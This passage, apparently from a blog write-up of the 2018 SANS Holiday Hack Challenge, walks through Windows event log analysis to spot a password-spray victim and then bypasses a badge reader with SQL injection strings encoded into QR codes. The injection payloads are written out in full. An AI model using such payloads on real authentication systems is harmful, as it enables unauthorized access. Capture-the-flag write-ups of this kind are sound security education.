      1 <Data Name="TargetUserName">michael.miller</Data>
      1 <Data Name="TargetUserName">michael.smith</Data>
      1 <Data Name="TargetUserName">michael.taylor</Data>
      1 <Data Name="TargetUserName">michael.williams</Data>
      1 <Data Name="TargetUserName">michael.wilson</Data>
      1 <Data Name="TargetUserName">michelle.smith</Data>
      1 <Data Name="TargetUserName">mike.brown</Data>
      1 <Data Name="TargetUserName">mike.johnson</Data>
      1 <Data Name="TargetUserName">mike.jones</Data>
      1 <Data Name="TargetUserName">mike.miller</Data>
      1 <Data Name="TargetUserName">mike.smith</Data>
      1 <Data Name="TargetUserName">mike.williams</Data>
      2 <Data Name="TargetUserName">minty.candycane</Data>
      1 <Data Name="TargetUserName">mohamed.ahmed</Data>
      1 <Data Name="TargetUserName">mohamed.ali</Data>
      1 <Data Name="TargetUserName">muhammad.ali</Data>
      1 <Data Name="TargetUserName">naveen.kumar</Data>
      1 <Data Name="TargetUserName">nicole.smith</Data>
      1 <Data Name="TargetUserName">paul.smith</Data>
      1 <Data Name="TargetUserName">pepper.minstix</Data>
      1 <Data Name="TargetUserName">pradeep.kumar</Data>
      1 <Data Name="TargetUserName">praveen.kumar</Data>
      1 <Data Name="TargetUserName">rachel.smith</Data>
      1 <Data Name="TargetUserName">rahul.kumar</Data>
      1 <Data Name="TargetUserName">rahul.sharma</Data>
      1 <Data Name="TargetUserName">rahul.singh</Data>
      1 <Data Name="TargetUserName">raj.kumar</Data>
      1 <Data Name="TargetUserName">rajesh.kumar</Data>
      1 <Data Name="TargetUserName">rakesh.kumar</Data>
      1 <Data Name="TargetUserName">ravi.kumar</Data>
      1 <Data Name="TargetUserName">richard.smith</Data>
      1 <Data Name="TargetUserName">robert.brown</Data>
      1 <Data Name="TargetUserName">robert.johnson</Data>
      1 <Data Name="TargetUserName">robert.jones</Data>
      1 <Data Name="TargetUserName">robert.smith</Data>
      1 <Data Name="TargetUserName">robert.williams</Data>
      1 <Data Name="TargetUserName">rohit.sharma</Data>
      1 <Data Name="TargetUserName">ryan.johnson</Data>
      1 <Data Name="TargetUserName">ryan.smith</Data>
      1 <Data Name="TargetUserName">salman.khan</Data>
      1 <Data Name="TargetUserName">sam.smith</Data>
      1 <Data Name="TargetUserName">samantha.smith</Data>
      1 <Data Name="TargetUserName">sameer.khan</Data>
      1 <Data Name="TargetUserName">sana.khan</Data>
      1 <Data Name="TargetUserName">sandeep.kumar</Data>
      1 <Data Name="TargetUserName">sandeep.singh</Data>
      1 <Data Name="TargetUserName">sanjay.kumar</Data>
      1 <Data Name="TargetUserName">santhosh.kumar</Data>
      1 <Data Name="TargetUserName">santosh.kumar</Data>
      1 <Data Name="TargetUserName">sara.khan</Data>
      1 <Data Name="TargetUserName">sarah.johnson</Data>
      1 <Data Name="TargetUserName">sarah.jones</Data>
      1 <Data Name="TargetUserName">sarah.smith</Data>
      1 <Data Name="TargetUserName">sathish.kumar</Data>
      1 <Data Name="TargetUserName">scott.johnson</Data>
      1 <Data Name="TargetUserName">scott.smith</Data>
      1 <Data Name="TargetUserName">senthil.kumar</Data>
      2 <Data Name="TargetUserName">shinny.upatree</Data>
      3 <Data Name="TargetUserName">sparkle.redberry</Data>
      1 <Data Name="TargetUserName">stephanie.smith</Data>
      1 <Data Name="TargetUserName">steve.johnson</Data>
      1 <Data Name="TargetUserName">steve.smith</Data>
      1 <Data Name="TargetUserName">steven.smith</Data>
      1 <Data Name="TargetUserName">sugerplum.mary</Data>
      1 <Data Name="TargetUserName">sunil.kumar</Data>
      1 <Data Name="TargetUserName">suresh.kumar</Data>
      1 <Data Name="TargetUserName">test.user</Data>
      1 <Data Name="TargetUserName">tim.smith</Data>
      1 <Data Name="TargetUserName">tom.smith</Data>
      1 <Data Name="TargetUserName">tyler.smith</Data>
      1 <Data Name="TargetUserName">vijay.kumar</Data>
      1 <Data Name="TargetUserName">vinod.kumar</Data>
      2 <Data Name="TargetUserName">wunorse.openslae</Data>
      1 <EventData><Data Name="TargetUserName">Administrator</Data>
      1 <EventData><Data Name="TargetUserName">Administrator@EM.KRINGLECON.COM</Data>
     18 <EventData><Data Name="TargetUserName">Administrators</Data>
     16 <EventData><Data Name="TargetUserName">Backup Operators</Data>
     36 <EventData><Data Name="TargetUserName">HealthMailboxbab78a6</Data>
     35 <EventData><Data Name="TargetUserName">HealthMailboxbab78a6@EM.KRINGLECON.COM</Data>
      4 <EventData><Data Name="TargetUserName">HealthMailboxbe58608</Data>
      4 <EventData><Data Name="TargetUserName">HealthMailboxbe58608@EM.KRINGLECON.COM</Data>
     63 <EventData><Data Name="TargetUserName">WIN-KCON-EXCH16$@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">bushy.evergreen</Data>
      1 <EventData><Data Name="TargetUserName">bushy.evergreen@EM.KRINGLECON.COM</Data>
      2 <EventData><Data Name="TargetUserName">minty.candycane</Data>
      2 <EventData><Data Name="TargetUserName">minty.candycane@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">shinny.upatree</Data>
      1 <EventData><Data Name="TargetUserName">shinny.upatree@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">sparkle.redberry</Data>
      1 <EventData><Data Name="TargetUserName">sparkle.redberry@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">wunorse.openslae</Data>
      1 <EventData><Data Name="TargetUserName">wunorse.openslae@EM.KRINGLECON.COM</Data>
```

From the get go this seems like a lot of data to look through, and it might be confusing for some of you as to why we're doing this, especially if you've never done blue team work.

Well let me quickly explain. [Windows Event Logs](https://docs.microsoft.com/en-us/windows/desktop/wes/windows-event-log) log every event that occurs on your computer and in your AD environment. Each event contains a specific [Event ID](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx) that details what event took place, such as a login, logout, [kerberos](https://web.mit.edu/kerberos/) tgt, etc.

Each event then usually contains information such as the username of the account associated to the event, computer name of where the event took place, domain name, time, and even IP if this event is occurring from an external IP.

The reason we are parsing this data and sorting per user name is because - as I stated before - a password spraying attack attempts to login to an account with a single password. Upon fail, it moves on to the next account, and it does that till it successfully logs in.

We can see from our parsed usernames that the attack starts with `aaron.smith` and works it's way down. The number `1` next to the name means that there was a single event logged for that username. So, because there is only one event, that means the login failed. BUT, if there is more then one, then it's possible that a login was successful and a kerberos ticket was granted for the user - thus alerting us of the compromised user.

So if we go back and dig through the logs we should see the following:

```console
      2 <Data Name="TargetUserName">bushy.evergreen</Data>
      2 <Data Name="TargetUserName">minty.candycane</Data>
      2 <Data Name="TargetUserName">shinny.upatree</Data>
      3 <Data Name="TargetUserName">sparkle.redberry</Data>
      2 <Data Name="TargetUserName">wunorse.openslae</Data>
```

All of these users have more then 1 event associated with them! So they might be the compromised user... but how do we know for sure which one it really is?

Well... let's look toward the end of the log.

```console
      1 <EventData><Data Name="TargetUserName">Administrator</Data>
      1 <EventData><Data Name="TargetUserName">Administrator@EM.KRINGLECON.COM</Data>
     18 <EventData><Data Name="TargetUserName">Administrators</Data>
     16 <EventData><Data Name="TargetUserName">Backup Operators</Data>
     36 <EventData><Data Name="TargetUserName">HealthMailboxbab78a6</Data>
     35 <EventData><Data Name="TargetUserName">HealthMailboxbab78a6@EM.KRINGLECON.COM</Data>
      4 <EventData><Data Name="TargetUserName">HealthMailboxbe58608</Data>
      4 <EventData><Data Name="TargetUserName">HealthMailboxbe58608@EM.KRINGLECON.COM</Data>
     63 <EventData><Data Name="TargetUserName">WIN-KCON-EXCH16$@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">bushy.evergreen</Data>
      1 <EventData><Data Name="TargetUserName">bushy.evergreen@EM.KRINGLECON.COM</Data>
      2 <EventData><Data Name="TargetUserName">minty.candycane</Data>
      2 <EventData><Data Name="TargetUserName">minty.candycane@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">shinny.upatree</Data>
      1 <EventData><Data Name="TargetUserName">shinny.upatree@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">sparkle.redberry</Data>
      1 <EventData><Data Name="TargetUserName">sparkle.redberry@EM.KRINGLECON.COM</Data>
      1 <EventData><Data Name="TargetUserName">wunorse.openslae</Data>
      1 <EventData><Data Name="TargetUserName">wunorse.openslae@EM.KRINGLECON.COM</Data>
```

Notice how Minty has [Event Data](https://docs.microsoft.com/en-us/windows/desktop/eventlog/event-data) logs? This seems suspicious to us, so let's go ahead and grep again for `TargetUserName`, but this time let's use the `-nr` option in grep to print out the numbered line of where the name appears. This way we can used [sed](https://linux.die.net/man/1/sed) to print out lines interesting to us.

```console
elf@95f7201e900b:~$ cat events.xml | grep -nr "TargetUserName"
---snip---
events.xml:34466:<Data Name="TargetUserName">HealthMailboxbe58608</Data>  
events.xml:34511:<Data Name="TargetUserName">mike.miller</Data>  
events.xml:34550:<Data Name="TargetUserName">mike.smith</Data>  
events.xml:34589:<Data Name="TargetUserName">mike.williams</Data>  
events.xml:34623:<EventData><Data Name="TargetUserName">minty.candycane</Data>  
events.xml:34655:<EventData><Data Name="TargetUserName">minty.candycane@EM.KRINGLECON.COM</Data>  
events.xml:34689:<Data Name="TargetUserName">minty.candycane</Data>
---snip---
```

We can see that an event for Minty occurs on line `34623` and line `34655`. So to make things easier we will read all the data from lines `34530` to `34660`.

```console
elf@95f7201e900b:~$ cat events.xml | sed -n '34530,34660p'    
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:05:02.088915"></TimeCreated>
<EventRecordID>240166</EventRecordID>
<Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15576"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
<Data Name="SubjectDomainName">EM.KRINGLECON</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">mike.smith</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">8</Data>
<Data Name="LogonProcessName">Advapi  </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">WIN-KCON-EXCH16</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x00000000000019f0</Data>
<Data Name="ProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">33661</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:05:02.652279"></TimeCreated>
<EventRecordID>240167</EventRecordID>
<Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15576"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
<Data Name="SubjectDomainName">EM.KRINGLECON</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">mike.williams</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">8</Data>
<Data Name="LogonProcessName">Advapi  </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">WIN-KCON-EXCH16</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x00000000000019f0</Data>
<Data Name="ProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">38883</Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4768</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>14339</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:05:03.398243"></TimeCreated>
<EventRecordID>240168</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15576"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="TargetUserName">minty.candycane</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="TargetSid">S-1-5-21-25059752-1411454016-2901770228-1156</Data>
<Data Name="ServiceName">krbtgt</Data>
<Data Name="ServiceSid">S-1-5-21-25059752-1411454016-2901770228-502</Data>
<Data Name="TicketOptions">0x40810010</Data>
<Data Name="Status">0x00000000</Data>
<Data Name="TicketEncryptionType">0x00000012</Data>
<Data Name="PreAuthType">2</Data>
<Data Name="IpAddress">::1</Data>
<Data Name="IpPort">0</Data>
<Data Name="CertIssuerName"></Data>
<Data Name="CertSerialNumber"></Data>
<Data Name="CertThumbprint"></Data>
</EventData>
</Event>

<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4769</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>14337</Task>
<Opcode>0</Opcode>
<Keywords>0x8020000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 13:05:03.682758"></TimeCreated>
<EventRecordID>240169</EventRecordID>
<Correlation ActivityID="" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15576"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="TargetUserName">minty.candycane@EM.KRINGLECON.COM</Data>
<Data Name="TargetDomainName">EM.KRINGLECON.COM</Data>
<Data Name="ServiceName">WIN-KCON-EXCH16$</Data>
<Data Name="ServiceSid">S-1-5-21-25059752-1411454016-2901770228-1000</Data>
<Data Name="TicketOptions">0x40810000</Data>
<Data Name="TicketEncryptionType">0x00000012</Data>
```

We can see that the first event contains an Event ID of [4625](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4625) for the user `mike.smith` which dictates that the account login failed. We also see that this event occurred on the `WIN-KCON-EXCH16` workstation, which dictates that Mike was part of the password spraying attack.

Going down, we see that the same Event ID of 4625 occurs for `mike.williams`.

After mike we see a new Event ID of [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4768) for `minty.candycane` followed by another Event ID of [4769](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4769) with the target computer name being `WIN-KCON-EXCH16.EM.KRINGLECON.COM`. 

An event of 4768 dictates that a Kerberos authentication ticket ([TGT](https://docs.microsoft.com/en-us/windows/desktop/secauthn/ticket-granting-tickets)) was requested, and an event of 4769 dictates that a Kerberos [service ticket](https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=KerbSrvTxOp) was requested.

Since this occurred, this means that Minty successfully authenticated to Kerberos, and revived a valid service ticket for the Exchange 2016 server. And since this event occurred directly during the spraying attack, we can for sure assume that her account was compromised.

Let's see if we are right!

```console
elf@d7e7d82db8f0:~$ ./runtoanswer 
Loading, please wait......



Whose account was successfully accessed by the attacker's password spray? minty.candycane


MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXO0NMxl0MXOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMxlllooldollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMNKkollldOKWMMNKOKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollox0NMMMxlOMMMXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMWXOdlllokKxlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMNkkXMMMMMMMMMMMWKkollllllldkKWMMMMMMMMMMM0kOWMMMMMMMMMMMM
MMMMMMWKXMMMkllxMMMMMMMMMMMMMMMXOold0NMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMdllKMMkllxMMMMMMMMMMMMN0KNMxl0MN00WMMMMMMMMMMMMollKMMOllkMMMMMM
Mkox0XollKMMkllxMMMMMMMMMMMMxllldoldolllOMMMMMMMMMMMMollKMMkllxXOdl0M
MMN0dllll0MMkllxMMMMMMMMMMMMMN0xolllokKWMMMMMMMMMMMMMollKMMkllllx0NMM
MW0xolllolxOxllxMMNxdOMMMMMWMMMMWxlOMMMMWWMMMMWkdkWMMollOOdlolllokKMM
M0lldkKWMNklllldNMKlloMMMNolok0NMxl0MX0xolxMMMXlllNMXolllo0NMNKkoloXM
MMWWMMWXOdlllokdldxlloWMMXllllllooloollllllWMMXlllxolxxolllx0NMMMNWMM
MMMN0kolllx0NMMW0ollll0NMKlloN0kolllokKKlllWMXklllldKMMWXOdlllokKWMMM
MMOllldOKWMMMMkollox0OdldxlloMMMMxlOMMMNlllxoox0Oxlllo0MMMMWKkolllKMM
MMW0KNMMMMMMMMKkOXWMMMW0olllo0NMMxl0MWXklllldXMMMMWKkkXMMMMMMMMX0KWMM
MMMMMMMMMMMMMMMMMMMW0xollox0Odlokdlxxoox00xlllokKWMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMWollllOWMMMMNklllloOWMMMMNxllllxMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMN0xlllokK0xookdlxxookK0xollokKWMMMMMMMMMMMMMMMMMMM
MMWKKWMMMMMMMMKk0XMMMMW0ollloOXMMxl0MWKklllldKWMMMWXOOXMMMMMMMMNKKMMM
MMkllldOXWMMMMklllok00xoodlloMMMMxlOMMMNlllxook00xollo0MMMMWKkdlllKMM
MMMN0xollox0NMMW0ollllONMKlloNKkollldOKKlllWMXklllldKWMMX0xlllok0NMMM
MMWWMMWKkollldkxlodlloWMMXllllllooloollllllWMMXlllxooxkollldOXMMMWMMM
M0lldOXWMNklllldNMKlloMMMNolox0XMxl0WXOxlldMMMXlllNMXolllo0WMWKkdloXM
MW0xlllodldOxllxMMNxdOMMMMMNMMMMMxlOMMMMWNMMMMWxdxWMMollkkoldlllokKWM
MMN0xllll0MMkllxMMMMMMMMMMMMMNKkolllokKWMMMMMMMMMMMMMollKMMkllllkKWMM
MkldOXollKMMkllxMMMMMMMMMMMMxlllooloolll0MMMMMMMMMMMMollKMMkllxKkol0M
MWWMMMdllKMMkllxMMMMMMMMMMMMXO0XMxl0WXOONMMMMMMMMMMMMollKMMOllkMMMWMM
MMMMMMNKKMMMkllxMMMMMMMMMMMMMMMN0oldKWMMMMMMMMMMMMMMMollKMMWKKWMMMMMM
MMMMMMMMMMMMXkxXMMMMMMMMMMMWKkollllllldOXMMMMMMMMMMMM0xkWMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMX0xlllok0xlk0xollox0NMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMXollldOXMMMxlOMMWXOdllldWMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMW0OKWMMWKkollldOXWMMN0kKMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMklllooloollo0MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMXOOXMxl0WKOONMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMkl0MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations
```

And we were right!

### Badge Manipulation

Upon successfully completing the Yule Log Analysis CranPI, we can talk to Pepper again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-45.png"><img src="/images/hh18-45.png"></a></p>

For this objective, we need to bypass the authentication mechanism associated with the room near Pepper Minstix, and figure out what is the access control number revealed by the door authentication panel.

<p align="center"><a href="/images/hh18-46.png"><img src="/images/hh18-46.png"></a></p>

For this objective we are provided with [a sample employee badge](https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg) to get us started.

<p align="center"><a href="/images/hh18-47.png"><img src="/images/hh18-47.png"></a></p>

Upon clicking the badge reader, and attempting to read Alabaster's badge, we get the following response.

<p align="center"><a href="/images/hh18-48.png"><img src="/images/hh18-48.png"></a></p>

Hmm... interesting. So it seems that Alabaster's account has been disabled and we'll need to find a way to bypass this.

Fortunately Pepper gave us a hint about a possible [SQL Injection](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#Auth_Bypass) in the badge reader, so let's see what we can do with that! 

For this challenge I utilized [zbarimg](http://manpages.ubuntu.com/manpages/bionic/man1/zbarimg.1.html) to read QR code images, and then used [qrencode](https://linux.die.net/man/1/qrencode) to generate my own test badges.

First let's start off by reading Alabaster's QR code to see if we can't get any hints on the structure of the badge.

```console
root@kali:~/HH# zbarimg alabaster_badge.jpg
QR-Code:oRfjg5uGHmbduj2m
scanned 1 barcode symbols from 1 images in 0.04 seconds
```

Okay, so it seems that this is some kind of UID or user ID. Since this is disabled, then we won't be able to utilize it.

Alright, so since we know that a possible SQL Injection vulnerability is viable in the badge reader, let's try creating a QR code with a simple injection.

```console
root@kali:~/HH# qrencode -s 10 -o test.png "Admin' or 1--"
root@kali:~/HH# zbarimg test.png
QR-Code:Admin' or 1--
scanned 1 barcode symbols from 1 images in 0.04 seconds
```

Upon utilizing that `test.png` QR code generated by zbarimg, we get the following server response.

```
EXCEPTION AT (LINE 96 "user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1".format(uid))"): (1064, u"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1")
```

Awesome! So we were able to get some SQL error information, including the structure of the query. So it seems that the QR code is just the UID, and it seems that we can inject into that UID as well. 

From the previous test injection, we see that we have an error near `'' Limit 1'` which means that we didn't properly close the SQL query.

As you can see below, this is how the SQL query will look once or injection took place.

```sql
user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = 'Admin' or 1--' LIMIT 1".format(uid))"
```

So it seems that the comment symbol (`--`) isn't commenting out the final `'` in the SQL Query. So what we need to do is create a query that will have an equal number of apostrophes and will close out the SQL query without an errors.

We will use the query of `test' or '1'='1` which means that the UID is equal to test or `1=1` which evaluates to true. In SQL if a query evaluates to`true` then it should pull the first row, which is usually admin.

This injection will cause the query to close properly, and will look like so.

```sql
user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = 'test' or '1'='1' LIMIT 1".format(uid))"
```

So knowing that, let's go ahead and generate that new query.

```console
root@kali:~/HH# qrencode -s 10 -o test.png "test' or '1'='1"
root@kali:~/HH# zbarimg test.png
QR-Code:test' or '1'='1
scanned 1 barcode symbols from 1 images in 0.03 seconds
```

Once we submit that to the badge reader, we can see that we get a `User Account Has Been Disabled` error.

<p align="center"><a href="/images/hh18-49.png"><img src="/images/hh18-49.png"></a></p>

Awesome! So the query is being closed properly and we are pulling the first row, but unfortunately, the first user is also disabled.

But let's not worry! Since we are able to inject SQL into the properly close query, we can add `enabled=1` which will allow us to query any account that is enabled! At the same time we can add another `uid='1=1 --'` query to query for the first UID and attempt to comment out the rest of the query.

```console
root@kali:~/HH# qrencode -s 10 -o test.png "1=1' or '1=1' AND enabled=1 or uid='1=1 -- "
root@kali:~/HH# zbarimg test.png
QR-Code:1=1' or '1=1' AND enabled=1 or uid='1=1 --
scanned 1 barcode symbols from 1 images in 0.06 seconds
```

So, with that injection out SQL query should look like so!

```sql
user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '1=1' or '1=1' AND enabled=1 or uid='1=1 --' LIMIT 1".format(uid))"
```

Alright, let's give this a shot! Once we submit the test QR code to the badge reader we can see from the server response that we got a User Access Granted along with the control number!

<a href="/images/hh18-50.png"><img src="/images/hh18-50.png"></a></p>

Once we know that, we can navigate to the sixth objective in our badge and enter `19880715` to complete the objective!

<p align="center"><a href="/images/hh18-51.png"><img src="/images/hh18-51.png"></a></p>

## Objective 7

### Dev Ops Fai - CranPi

From Pepper, we go back to the main stairwell, and to the left hand side on the second floor we meet Sparkle Redberry!

<p align="center"><a href="/images/hh18-52.png"><img src="/images/hh18-52.png"></a></p>

Talking to Sparklewe figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-52-1.png"><img src="/images/hh18-52-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
                                   .0.                                    
                               .:llOXKllc.                                
                                 .OXXXK,                                  
                                 '0l'cOc                                  
                                 ..';'..                                  
                               .';::::::'.                                
                            .':::::::::::::,.                             
                         .'::loc::::::::::::::,.                          
                      .'::::oMMNc::::::::::::::::,.                       
                    .,;;,,,,:dxl:::::::,,,:::;,,,,,,.                     
                    .,'  ..;:::::::::::;,;::::,.                          
                      .';::::::::::::::::::::dOxc,.                       
                   .';:::::::::okd::::::::::cXMWd:::,.                    
                .';:::::::::::cNMMo:::::::::::lc:::::::,.                 
             .'::::::::::::::::col::::::::::::;:::::::::::,.              
                   .;:::,,,:::::::::::::::::;,,,:::::'.                   
                .'::::::;;;:::::::::::dko:::::;::::::::;.                 
             .,::::::::::::::::::::::lWMWc::::::::::::::::;.              
            ..:00:...;::::loc:::::::::coc::::::::::::'.;;.....            
              :NNl.,:::::xMMX:::::::::::::::::::::::::;,,.                
               .,::::::::cxxl::::,,,:::::::::::::::::::::;.               
            .,:::::::c:::::::::::;;;:::::::;;:::::kNXd::::::;.            
         .,::::::::cKMNo::::::::::::::::::;,,;::::xKKo:::::::::;.         
       .'''''',:::::x0Oc:::::::::oOOo:::::::::::::::::::::;'''''''.       
            .,:::::::::::::::::::kWWk::::::::::::::ldl:::::;'.            
         .,::;,,::::::::::::::::::::::::::::::::::lMMMl:::::::;'.         
      .,:::::;,;:::::::::::::::::::::::::::::::::::ldl::::::::::::'.      
   .,::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::'.   
                               ..;;;;;;;;'.                               
                             .';;;;;;;;;;;;'.                             
                          .';;;;;;;;;;;;;;;;;;'.                          
                         ........................                         
                                                                          


Coalbox again, and I've got one more ask.
Sparkle Q. Redberry has fumbled a task.
Git pull and merging, she did all the day;
With all this gitting, some creds got away.

Urging - I scolded, "Don't put creds in git!"
She said, "Don't worry - you're having a fit.
If I did drop them then surely I could,
Upload some new code done up as one should."

Though I would like to believe this here elf,
I'm worried we've put some creds on a shelf.
Any who's curious might find our "oops,"
Please find it fast before some other snoops!

Find Sparkle's password, then run the runtoanswer tool.
elf@5d4e2477ec3b:~$
```

So it seems that for this CranPI challenge we need to find Sparkle's password in the git repository. Sparkle did provide a good [Git Cheat Sheet]([https://gist.github.com/hofmannsven/6814451](https://gist.github.com/hofmannsven/6814451)) in her hints, for those unfamiliar with git commands.

Alright, knowing that we need to do, let's see what we have to work with.

```console
elf@5d4e2477ec3b:~$ ls -la
total 5832
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:30 .
drwxr-xr-x 1 root root    4096 Dec 14 16:30 ..
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     1836 Dec 14 16:13 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Nov 14 09:48 kcconfmgmt
